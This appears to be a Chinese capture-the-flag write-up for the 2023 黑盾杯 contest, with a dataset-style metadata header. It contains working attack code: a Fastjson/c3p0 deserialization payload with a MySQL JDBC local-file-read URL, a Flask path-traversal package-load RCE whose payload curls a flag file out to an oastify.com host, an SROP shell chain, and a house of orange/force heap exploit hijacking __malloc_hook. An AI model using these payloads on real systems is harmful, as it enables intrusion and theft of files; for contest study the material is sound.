---
title: 2023 黑盾杯 writeup
contest: 黑盾杯
year: 2023
difficulty: hard
vuln_type: [web_unknown, deserialize, rce, sqli, stego_traffic, pwn_unknown, heap_exploit]
tags: [JdbcRowSetImpl, c3p0 HexAsciiSerializedMap, MySQL JDBC本地文件读, Flask site.addpackage, dnslog外带, mysqlbinlog, IOC匹配, house of orange, house of force, one_gadget, libc-2.27, SROP]
attack_chain: 反编译 jar 看 SecurityCheck 黑名单 → JdbcRowSetImpl+c3p0 userOverridesAsString+HexAsciiSerializedMap 触发 MySQL JDBC 读本地文件 → Flask 路由 /upload 目录穿越 + /install 装包 + /add 用 site.addpackage 加 Python 文件 → dnslog curl base64 外带 → mysqlbinlog 恢复 binlog → 正则 + 后 6 位匹配找 IOC → pwntools 连 pwn 远程 → SROP read /bin/sh → offbyone + house of orange 触发 sysmalloc + house of force 改 top chunk 任意地址 → 劫持 __malloc_hook → one_gadget 0x10a2fc
key_payload: MyBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#") ; site.addpackage('/tmp/extract', 'exp1.py', None) ; kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h=' 写 0x38 字节后接 SROP 链
one_liner: c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。
lesson: 限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率的替代链。
quality: high
---
# 2023 黑盾杯 writeup

**一、Web（初赛）Java 反序列化**

```java
// SecurityCheck 黑名单
Pattern.compile("(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)")
```

绕过：用 `Vaadin` 链 `NestedMethodProperty + PropertysetItem + MyBean` 触发 `MyBean.getConnection` → JdbcRowSetImpl → JNDI/反序列化打 MySQL JDBC 读文件。

```java
myBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#");
```

Fastjson payload：
```json
{"1":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},
 "2":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
      "userOverridesAsString":"HexAsciiSerializedMap: <hex>;"}}
```

`c3p0` 的 `WrapperConnectionPoolDataSource` 反序列化 hex 流 → MySQL JDBC 收到 `fileread_file://` 参数 → 读本地文件。

**二、Web（复赛）Python Flask 装包 RCE**

```python
@app.route('/upload', methods=['POST'])
def upload():
    f = request.files["data"]
    open(f'/tmp/storage/{f.filename}', 'wb+').write(f.read())

@app.route('/add', methods=['GET'])
def add():
    site.addpackage("/tmp/extract", request.args.get('name'), None)
```

上传文件名用 `../` 穿越到 `contrib/packages/`，`/install` 用 `shutil.unpack_archive` 解压，`/add` 调 `site.addpackage` 加载任意 `.py` 到 `site-packages`。

`exp1.py`：
```python
import os; os.system("curl http://xxxx.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`")
```

`flag{a8771ab4aa}`。

**三、Misc DNS 流量分析（初赛）**

`504b0304` 头 → zip 伪加密 → CRC32 碰撞爆破 `Ap3l` 密码 → 打开得 `flag{496d8981f449e45f6e39e1faa0b1ab8a}`。

**四、Misc 威胁情报（复赛）**

```python
# 提取 network.txt 中所有 DestHost
# 跟 ioc.txt 正则留下的 ip/domain 列表用后 6 位交叉匹配
# 大量命中 *.y.net → flag{lprbriry.net}
```

**五、Crypto py-math-game**

```python
pwn.context.log_level='debug'
conn = remote('39.104.26.167', 6681)
retest = conn.recv().decode()
sper = retest.split('n')[2].split('=')[0]
flager = eval(sper.replace('X', '*'))  # eval 算表达式
conn.sendline(str(flager).encode())
conn.sendline(b'open("/flag.txt").read()')
```

eval 客户端算数学表达式再回传 + Python `open` 读 flag（沙箱 open 没禁）。

**六、Pwn 1（初赛）SROP**

```python
kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='  # 输入密码
s(kk + b'\x00')
s(b'a'*0x38 + p64(rsi_r15) + p64(elf.got['alarm'])*2 + p64(elf.sym['read']) +
  p64(rsi_r15) + p64(buf)*2 + p64(elf.sym['read']) +
  p64(0x400AEA) + p64(0)*2 + p64(elf.got['alarm']) + p64(0)*2 + p64(buf) +
  p64(0x400AD0))
s(b'\xf5')
s(b'/bin/sh\x00'.ljust(0x3b, b'a'))
```

密码 `kk` 输错触发栈溢出 0x38 字节 → rsi_r15 gadget 设 rsi=alarm_got, r15=junk → 调 read 覆盖 alarm 入口为 SROP frame → 二次 read 写 /bin/sh。

**七、Pwn 2（复赛）leak（house of orange + house of force）**

```python
add(0, 0x18)
payload = p64(0)*3 + p64(0xd91)   # 改 top chunk size 0xd91 对齐到页
edit(0, payload)
add(1, 0x1008)                     # 触发 sysmalloc 进 unsorted bin
add(2, 0xd50)                      # 拿 unsorted bin 一部分
show(2)                            # 泄露 libc
libc_base = u64(ly.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3ec2a0
malloc_hook = libc_base + libc.sym['__malloc_hook']
one_gadget = libc_base + 0x10a2fc
edit(1, b'\x00'*0x1008 + p64(0xffffffffffffffff))  # 改 top chunk 为超大
add(3, -0x22010)                   # house of force 跳到 __malloc_hook 附近
add(4, 0x100)
edit(4, b'\x07'*0x30 + p64(malloc_hook)*0x10)
add(5, 0xa0)
edit(5, p64(one_gadget))           # 劫持 __malloc_hook
add(6, 0x200)                      # 触发 malloc → one_gadget
```

libc-2.27 + offbyone + house of orange 触发 `sysmalloc` → unsorted bin 泄露 libc → house of force（top chunk 设为 -1）任意地址分配 → 写 `__malloc_hook` → one_gadget 0x10a2fc 拿 shell。
